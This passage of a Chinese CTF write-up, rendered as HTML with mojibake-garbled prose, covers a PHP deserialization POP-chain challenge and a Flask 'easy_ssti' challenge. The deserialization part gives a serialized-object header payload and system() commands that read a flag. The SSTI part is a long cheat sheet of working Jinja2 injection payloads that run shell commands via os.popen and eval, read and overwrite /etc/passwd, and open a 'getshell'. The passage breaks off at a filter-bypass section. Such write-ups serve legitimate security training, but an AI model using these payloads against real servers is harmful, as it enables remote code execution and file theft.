</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$text</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$eeee</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">gBoBg</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$name</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$file</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$coos</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">w_wuw_w</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$aaa</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$key</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$file</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">cycycycy</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">EeE</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">-&gt;</span><span class="na">text</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">gBoBg</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">-&gt;</span><span class="na">text</span> <span class="o">-&gt;</span><span class="na">file</span> <span class="o">=</span> <span class="s2">&#34;any&#34;</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">-&gt;</span><span class="na">text</span> <span class="o">-&gt;</span><span class="na">coos</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">w_wuw_w</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># æ ‡å‡†è¾“å‡ºï¼šO:3:&#34;EeE&#34;:2:{s:4:&#34;text&#34;;O:5:&#34;gBoBg&#34;:3:{s:4:&#34;name&#34;;N;s:4:&#34;file&#34;;s:3:&#34;any&#34;;s:4:&#34;coos&#34;;O:7:&#34;w_wuw_w&#34;:3:{s:3:&#34;aaa&#34;;N;s:3:&#34;key&#34;;N;s:4:&#34;file&#34;;N;}}s:4:&#34;eeee&#34;;N;}
</span></span></span></code></pre></td></tr></table>
</div>
</div><h4 id="2çŸ¥è¯†ç‚¹-1">2.çŸ¥è¯†ç‚¹</h4>
<h5 id="ååºåˆ—åŒ–æ¼æ´">ååºåˆ—åŒ–æ¼æ´</h5>
<p>ååºåˆ—åŒ–æ¼æ´çš„æˆå› åœ¨äºä»£ç ä¸­çš„ <code>unserialize()</code> æ¥æ”¶çš„å‚æ•°å¯æ§ï¼Œè¿™ä¸ªå‡½æ•°çš„å‚æ•°æ˜¯ä¸€ä¸ªåºåˆ—åŒ–çš„å¯¹è±¡ï¼Œè€Œåºåˆ—åŒ–çš„å¯¹è±¡åªå«æœ‰å¯¹è±¡çš„å±æ€§ï¼Œåˆ©ç”¨å¯¹å¯¹è±¡å±æ€§çš„ç¯¡æ”¹å®ç°æœ€ç»ˆçš„æ”»å‡»ã€‚</p>
<h5 id="åˆ©ç”¨æ‰‹æ³•">åˆ©ç”¨æ‰‹æ³•</h5>
<p>å¯¹è±¡çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–åªèƒ½æ˜¯å…¶ä»–ç±»çš„å±æ€§ï¼Œç¯¡æ”¹ååºåˆ—åŒ–çš„å­—ç¬¦ä¸²åªèƒ½æ§åˆ¶é¢„å…ˆè®¾ç½®å¥½çš„å±æ€§ï¼Œå¦‚æœæƒ³åˆ©ç”¨ç±»é‡Œé¢çš„æ–¹æ³•ï¼Œéœ€è¦åˆ©ç”¨é­”æœ¯æ–¹æ³•ï¼Œé­”æœ¯æ–¹æ³•çš„è°ƒç”¨æ˜¯åœ¨è¯¥ç±»çš„åºåˆ—åŒ–æˆ–è€…ååºåˆ—åŒ–çš„åŒæ—¶è‡ªåŠ¨å®Œæˆï¼Œä¸éœ€è¦äººå·¥å¹²é¢„ã€‚å› æ­¤åªè¦ç±»ä¸­å‡ºç°äº†èƒ½åˆ©ç”¨çš„é­”æœ¯æ–¹æ³•ï¼Œå°±èƒ½é€šè¿‡ååºåˆ—åŒ–ï¼Œæ§åˆ¶å…¶å¯¹è±¡å±æ€§ï¼Œä»è€Œå®ç°å¯¹è¿™äº›å‡½æ•°ï¼ˆæ–¹æ³•ï¼‰çš„æ“æ§ã€‚</p>
<h5 id="å¸¸è§é­”æœ¯æ–¹æ³•">å¸¸è§é­”æœ¯æ–¹æ³•</h5>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">__wakeup() //æ‰§è¡Œunserialize()ï¼Œä¼šå…ˆè°ƒç”¨è¿™ä¸ªå‡½æ•°
</span></span><span class="line"><span class="cl">__sleep() //æ‰§è¡Œserialize()ï¼Œä¼šå…ˆè°ƒç”¨è¿™ä¸ªå‡½æ•°
</span></span><span class="line"><span class="cl">__destruct() //å¯¹è±¡è¢«é”€æ¯æ—¶è§¦å‘
</span></span><span class="line"><span class="cl">__call() //åœ¨å¯¹è±¡ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘
</span></span><span class="line"><span class="cl">__callStatic() //åœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘
</span></span><span class="line"><span class="cl">__get() //ç”¨äºä»ä¸å¯è®¿é—®çš„å±æ€§è¯»å–æ•°æ®æˆ–è€…ä¸å­˜åœ¨è¿™ä¸ªé”®éƒ½ä¼šè°ƒç”¨æ­¤æ–¹æ³•
</span></span><span class="line"><span class="cl">__set() //ç”¨äºå°†æ•°æ®å†™å…¥ä¸å¯è®¿é—®çš„å±æ€§
</span></span><span class="line"><span class="cl">__isset() //åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šè°ƒç”¨isset()æˆ–empty()è§¦å‘
</span></span><span class="line"><span class="cl">__unset() //åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šä½¿ç”¨unset()è§¦å‘
</span></span><span class="line"><span class="cl">__toString() //æŠŠç±»å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘
</span></span><span class="line"><span class="cl">__invoke() //å½“å°è¯•å°†å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘
</span></span></code></pre></td></tr></table>
</div>
</div><h5 id="åˆ©ç”¨è¿‡ç¨‹">åˆ©ç”¨è¿‡ç¨‹</h5>
<p>1.å¯»æ‰¾unserialize()å‡½æ•°çš„å‚æ•°æ˜¯å¦æœ‰å¯åˆ©ç”¨ç‚¹ï¼›
2.å¯»æ‰¾ååºåˆ—åŒ–çš„ç›®æ ‡ï¼Œé‡ç‚¹å¯»æ‰¾å­˜åœ¨ wakeup() æˆ– destruct() é­”æœ¯æ–¹æ³•çš„ç±»ï¼›
3.é€å±‚æŸ¥çœ‹è¯¥ç±»åœ¨é­”æœ¯æ–¹æ³•ä¸­ä½¿ç”¨çš„å±æ€§å’Œå±æ€§è°ƒç”¨çš„æ–¹æ³•ï¼Œè§‚å¯Ÿæ˜¯å¦æœ‰å¯æ§çš„å±æ€§ï¼Œå¯ä»¥å®ç°åœ¨å½“å‰è°ƒç”¨è¿‡ç¨‹ä¸­è§¦å‘ï¼›
4.æ‰¾åˆ°è¦æ§åˆ¶çš„å±æ€§ä¹‹åï¼Œå°†è¦ç”¨åˆ°çš„ä»£ç éƒ¨åˆ†å¤åˆ¶ä¸‹æ¥ï¼Œæ„é€ åºåˆ—åŒ–ã€‚</p>
<h5 id="phpååºåˆ—åŒ–popé“¾">PHPååºåˆ—åŒ–POPé“¾</h5>
<p>POP é¢å‘å±æ€§ç¼–ç¨‹(Property-Oriented Programing) ï¼šä»ç°æœ‰è¿è¡Œç¯å¢ƒä¸­å¯»æ‰¾ä¸€ç³»åˆ—çš„ä»£ç æˆ–è€…æŒ‡ä»¤è°ƒç”¨ï¼Œç„¶åæ ¹æ®éœ€æ±‚æ„æˆä¸€ç»„è¿ç»­çš„è°ƒç”¨é“¾,æœ€ç»ˆè¾¾åˆ°æ”»å‡»ç›®çš„ã€‚</p>
<p>ååºåˆ—åŒ–POPé“¾æ˜¯é€šè¿‡æ§åˆ¶å¯¹è±¡çš„å±æ€§æ¥å®ç°æ§åˆ¶ç¨‹åºçš„æ‰§è¡Œæµç¨‹ï¼Œè¿›è€Œå®ç°åˆ©ç”¨æœ¬èº«ä»£ç è¾¾åˆ°æ”»å‡»ç›®çš„ã€‚</p>
<h4 id="3payload-1">3.payload</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">bpæŠ“åŒ…ï¼š
</span></span><span class="line"><span class="cl">åœ¨headeréƒ¨åˆ†æ·»åŠ 
</span></span><span class="line"><span class="cl">AAAAAA:
</span></span><span class="line"><span class="cl">O:7:&#34;w_wuw_w&#34;:3:{s:3:&#34;aaa&#34;;N;s:3:&#34;key&#34;;R:2;s:4:&#34;file&#34;;s:9:&#34;check.php&#34;;}
</span></span><span class="line"><span class="cl">å¾—åˆ°check.phpæºç ï¼Œå…¶ä¸ºåŠ å¯†è„šæœ¬ï¼Œåˆ©ç”¨å·²çŸ¥å¯†æ–‡ï¼Œè¿›è¡Œè§£å¯†ï¼Œå¾—åˆ°fe1ka1ele1efp
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">æœ€ç»ˆæ„é€ payloadï¼š
</span></span><span class="line"><span class="cl">GET:
</span></span><span class="line"><span class="cl">?get=fe1ka1ele1efp
</span></span><span class="line"><span class="cl">POST:
</span></span><span class="line"><span class="cl">system(&#34;ls /&#34;);
</span></span><span class="line"><span class="cl">system(&#34;tac /f1agaaa&#34;);
</span></span><span class="line"><span class="cl">Header:
</span></span><span class="line"><span class="cl">AAAAAA: O:3:&#34;EeE&#34;:2:{s:4:&#34;text&#34;;O:5:&#34;gBoBg&#34;:3:{s:4:&#34;name&#34;;N;s:4:&#34;file&#34;;s:3:&#34;any&#34;;s:4:&#34;coos&#34;;O:7:&#34;w_wuw_w&#34;:3:{s:3:&#34;aaa&#34;;N;s:3:&#34;key&#34;;N;s:4:&#34;file&#34;;N;}}s:4:&#34;eeee&#34;;N;}
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="easy_ssti">easy_ssti</h2>
<h4 id="1åšé¢˜æ€è·¯-2">1.åšé¢˜æ€è·¯</h4>
<p>æŸ¥çœ‹é¢˜ç›®æºç ï¼Œä¸‹è½½å‹ç¼©åŒ…app.zipï¼Œè§£å‹å¾—åˆ°app.py</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">render_template_string</span><span class="p">,</span><span class="n">render_template</span>
</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/hello/&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">hello</span><span class="p">(</span><span class="n">name</span><span class="o">=</span><span class="kc">None</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;hello.html&#39;</span><span class="p">,</span><span class="n">name</span><span class="o">=</span><span class="n">name</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/hello/&lt;name&gt;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">hellodear</span><span class="p">(</span><span class="n">name</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="s2">&#34;ge&#34;</span> <span class="ow">in</span> <span class="n">name</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span><span class="s1">&#39;hello </span><span class="si">%s</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="n">name</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">elif</span> <span class="s2">&#34;f&#34;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">name</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span><span class="s1">&#39;hello </span><span class="si">%s</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="n">name</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s1">&#39;Nonononon&#39;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å‘ç°äº†pythonçš„flaskæ¡†æ¶ï¼Œéœ€è¦è®¿é—®/hello.htmlï¼Œæ‹¼æ¥ï¼š/hello/{{payload}}è¿›è¡Œæ³¨å…¥</p>
<p>è¯•ä¸€ä¸‹{{1+1}}ï¼Œé¡µé¢è¿”å›2ï¼Œè¯æ˜ä»£ç æ‰§è¡ŒæˆåŠŸï¼Œå­˜åœ¨SSTIæ³¨å…¥ã€‚</p>
<h4 id="2sstiæ³¨å…¥">2.SSTIæ³¨å…¥</h4>
<h5 id="sstiæ¼æ´åŸç†">sstiæ¼æ´åŸç†</h5>
<p>SSTIï¼ˆserver-side template injection)ä¸ºæœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥æ”»å‡»ï¼Œå®ƒä¸»è¦æ˜¯ç”±äºæ¡†æ¶çš„ä¸è§„èŒƒä½¿ç”¨è€Œå¯¼è‡´çš„ã€‚</p>
<p>ä¸»è¦ä¸ºpythonçš„ä¸€äº›æ¡†æ¶ï¼Œå¦‚ jinja2 mako tornado django flaskã€PHPæ¡†æ¶smarty twig thinkphpã€javaæ¡†æ¶jade velocity springç­‰ç­‰ä½¿ç”¨äº†æ¸²æŸ“å‡½æ•°æ—¶ï¼Œç”±äºä»£ç ä¸è§„èŒƒæˆ–ä¿¡ä»»äº†ç”¨æˆ·è¾“å…¥è€Œå¯¼è‡´äº†æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥ï¼Œæ¨¡æ¿æ¸²æŸ“å…¶å®å¹¶æ²¡æœ‰æ¼æ´ï¼Œä¸»è¦æ˜¯ç¨‹åºå‘˜å¯¹ä»£ç ä¸è§„èŒƒä¸ä¸¥è°¨é€ æˆäº†æ¨¡æ¿æ³¨å…¥æ¼æ´ï¼Œé€ æˆæ¨¡æ¿å¯æ§ã€‚</p>
<p><strong>å½“ç”¨æˆ·çš„è¾“å…¥æ•°æ®æ²¡æœ‰è¢«åˆç†çš„å¤„ç†æ§åˆ¶æ—¶ï¼Œå°±æœ‰å¯èƒ½æ•°æ®æ’å…¥äº†ç¨‹åºæ®µä¸­å˜æˆäº†ç¨‹åºçš„ä¸€éƒ¨åˆ†ï¼Œä»è€Œæ”¹å˜äº†ç¨‹åºçš„æ‰§è¡Œé€»è¾‘</strong>ã€‚</p>
<h5 id="flaskçš„jinja2å¼•æ“åˆ©ç”¨æ‰‹æ³•">flaskçš„jinja2å¼•æ“åˆ©ç”¨æ‰‹æ³•</h5>
<p>{{}}åœ¨Jinja2ä¸­ä½œä¸ºå˜é‡åŒ…è£¹æ ‡è¯†ç¬¦ï¼ŒJinja2åœ¨æ¸²æŸ“çš„æ—¶å€™ä¼šæŠŠ{{}}åŒ…è£¹çš„å†…å®¹å½“åšå˜é‡è§£ææ›¿æ¢ã€‚æ¯”å¦‚{{1+1}}ä¼šè¢«è§£ææˆ2ã€‚å¦‚æ­¤ä¸€æ¥å°±å¯ä»¥å®ç°å¦‚åŒsqlæ³¨å…¥ä¸€æ ·çš„æ³¨å…¥æ¼æ´ã€‚</p>
<h5 id="å¸¸ç”¨çš„æ„é€ è¯­å¥">å¸¸ç”¨çš„æ„é€ è¯­å¥</h5>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">æ— è¿‡æ»¤
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"># è¯»æ–‡ä»¶
</span></span><span class="line"><span class="cl">#è¯»å–æ–‡ä»¶ç±»ï¼Œ&lt;type â€˜fileâ€™&gt; fileä½ç½®ä¸€èˆ¬ä¸º40ï¼Œç›´æ¥è°ƒç”¨
</span></span><span class="line"><span class="cl">{{[].__class__.__base__.__subclasses__()[40](&#39;flag&#39;).read()}} 
</span></span><span class="line"><span class="cl">{{[].__class__.__bases__[0].__subclasses__()[40](&#39;etc/passwd&#39;).read()}}
</span></span><span class="line"><span class="cl">{{[].__class__.__bases__[0].__subclasses__()[40](&#39;etc/passwd&#39;).readlines()}}
</span></span><span class="line"><span class="cl">{{[].__class__.__base__.__subclasses__()[257](&#39;flag&#39;).read()}} (python3)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">#ç›´æ¥ä½¿ç”¨popenå‘½ä»¤ï¼Œpython2æ˜¯éæ³•çš„ï¼Œåªé™äºpython3
</span></span><span class="line"><span class="cl">os._wrap_close ç±»é‡Œæœ‰popen
</span></span><span class="line"><span class="cl">{{&#34;&#34;.__class__.__bases__[0].__subclasses__()[128].__init__.__globals__[&#39;popen&#39;](&#39;whoami&#39;).read()}}
</span></span><span class="line"><span class="cl">{{&#34;&#34;.__class__.__bases__[0].__subclasses__()[128].__init__.__globals__.popen(&#39;whoami&#39;).read()}}
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">#è°ƒç”¨osçš„popenæ‰§è¡Œå‘½ä»¤
</span></span><span class="line"><span class="cl">#python2ã€python3é€šç”¨
</span></span><span class="line"><span class="cl">{{[].__class__.__base__.__subclasses__()[71].__init__.__globals__[&#39;os&#39;].popen(&#39;ls&#39;).read()}}
</span></span><span class="line"><span class="cl">{{[].__class__.__base__.__subclasses__()[71].__init__.__globals__[&#39;os&#39;].popen(&#39;ls /flag&#39;).read()}}
</span></span><span class="line"><span class="cl">{{[].__class__.__base__.__subclasses__()[71].__init__.__globals__[&#39;os&#39;].popen(&#39;cat /flag&#39;).read()}}
</span></span><span class="line"><span class="cl">{{&#39;&#39;.__class__.__base__.__subclasses__()[185].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;os&#39;).popen(&#39;cat /flag&#39;).read()}}
</span></span><span class="line"><span class="cl">{{&#34;&#34;.__class__.__bases__[0].__subclasses__()[250].__init__.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;id&#39;).read()}}
</span></span><span class="line"><span class="cl">{{&#34;&#34;.__class__.__bases__[0].__subclasses__()[250].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;os&#39;).popen(&#39;id&#39;).read()}}
</span></span><span class="line"><span class="cl">{{&#34;&#34;.__class__.__bases__[0].__subclasses__()[250].__init__.__globals__[&#39;os&#39;].popen(&#39;whoami&#39;).read()}}
</span></span><span class="line"><span class="cl">#python3ä¸“å±
</span></span><span class="line"><span class="cl">{{&#34;&#34;.__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__import__(&#39;os&#39;).popen(&#39;whoami&#39;).read()}}
</span></span><span class="line"><span class="cl">{{&#39;&#39;.__class__.__base__.__subclasses__()[128].__init__.__globals__[&#39;os&#39;].popen(&#39;ls /&#39;).read()}}
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">#è°ƒç”¨evalå‡½æ•°è¯»å–
</span></span><span class="line"><span class="cl">#python2
</span></span><span class="line"><span class="cl">{{[].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#34;__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()&#34;)}} 
</span></span><span class="line"><span class="cl">{{&#34;&#34;.__class__.__mro__[-1].__subclasses__()[60].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&#34;os&#34;).system(&#34;ls&#34;)&#39;)}}
</span></span><span class="line"><span class="cl">{{&#34;&#34;.__class__.__mro__[-1].__subclasses__()[61].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&#34;os&#34;).system(&#34;ls&#34;)&#39;)}}
</span></span><span class="line"><span class="cl">{{&#34;&#34;.__class__.__mro__[-1].__subclasses__()[29].__call__(eval,&#39;os.system(&#34;ls&#34;)&#39;)}}
</span></span><span class="line"><span class="cl">#python3
</span></span><span class="line"><span class="cl">{{().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[&#39;eval&#39;](&#34;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&#34;)}} 
</span></span><span class="line"><span class="cl">{{&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.values()[13][&#39;eval&#39;]}}
</span></span><span class="line"><span class="cl">{{&#34;&#34;.__class__.__mro__[-1].__subclasses__()[117].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;]}}
</span></span><span class="line"><span class="cl">{{&#34;&#34;.__class__.__bases__[0].__subclasses__()[250].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#34;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&#34;)}}
</span></span><span class="line"><span class="cl">{{&#34;&#34;.__class__.__bases__[0].__subclasses__()[250].__init__.__globals__.__builtins__.eval(&#34;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&#34;)}}
</span></span><span class="line"><span class="cl">{{&#39;&#39;.__class__.__base__.__subclasses__()[128].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&#34;os&#34;).popen(&#34;ls /&#34;).read()&#39;)}}
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">#è°ƒç”¨ importlibç±»
</span></span><span class="line"><span class="cl">{{&#39;&#39;.__class__.__base__.__subclasses__()[128][&#34;load_module&#34;](&#34;os&#34;)[&#34;popen&#34;](&#34;ls /&#34;).read()}}
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">#è°ƒç”¨linecacheå‡½æ•°
</span></span><span class="line"><span class="cl">{{&#39;&#39;.__class__.__base__.__subclasses__()[128].__init__.__globals__[&#39;linecache&#39;][&#39;os&#39;].popen(&#39;ls /&#39;).read()}}
</span></span><span class="line"><span class="cl">{{[].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;][&#39;os&#39;].popen(&#39;ls&#39;).read()}}
</span></span><span class="line"><span class="cl">{{[].__class__.__base__.__subclasses__()[168].__init__.__globals__.linecache.os.popen(&#39;ls /&#39;).read()}}
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">#è°ƒç”¨communicate()å‡½æ•°
</span></span><span class="line"><span class="cl">{{&#39;&#39;.__class__.__base__.__subclasses__()[128](&#39;whoami&#39;,shell=True,stdout=-1).communicate()[0].strip()}}
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">#å†™æ–‡ä»¶
</span></span><span class="line"><span class="cl">å†™æ–‡ä»¶çš„è¯å°±ç›´æ¥æŠŠä¸Šé¢çš„æ„é€ é‡Œçš„read()æ¢æˆwrite()å³å¯ï¼Œä¸‹é¢ä¸¾ä¾‹åˆ©ç”¨fileç±»å°†æ•°æ®å†™å…¥æ–‡ä»¶ã€‚
</span></span><span class="line"><span class="cl">{{&#34;&#34;.__class__.__bases__[0].__bases__[0].__subclasses__()[40](&#39;/tmp&#39;).write(&#39;test&#39;)}}  ----python2çš„strç±»å‹ä¸ç›´æ¥ä»å±äºå±äºåŸºç±»ï¼Œæ‰€ä»¥è¦ä¸¤æ¬¡ .__bases__
</span></span><span class="line"><span class="cl">{{&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;file&#39;](&#39;/etc/passwd&#39;).write(&#39;123456&#39;)}}
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">#é€šç”¨ getshell
</span></span><span class="line"><span class="cl">åŸç†å°±æ˜¯æ‰¾åˆ°å«æœ‰ __builtins__ çš„ç±»ï¼Œç„¶ååˆ©ç”¨ã€‚
</span></span><span class="line"><span class="cl">{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__==&#39;catch_warnings&#39; %}{{ c.__init__.__globals__[&#39;__builtins__&#39;].eval(&#34;__import__(&#39;os&#39;).popen(&#39;whoami&#39;).read()&#34;) }}{% endif %}{% endfor %}
</span></span><span class="line"><span class="cl">{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__==&#39;catch_warnings&#39; %}{{ c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;filename&#39;, &#39;r&#39;).read() }}{% endif %}{% endfor %}
</span></span></code></pre></td></tr></table>
</div>
</div><h5 id="æœ‰è¿‡æ»¤ç»•è¿‡-">æœ‰è¿‡æ»¤â€”â€”ç»•è¿‡ .</h5>
<p>1.ä¸­æ‹¬å·[]ç»•è¿‡</p>
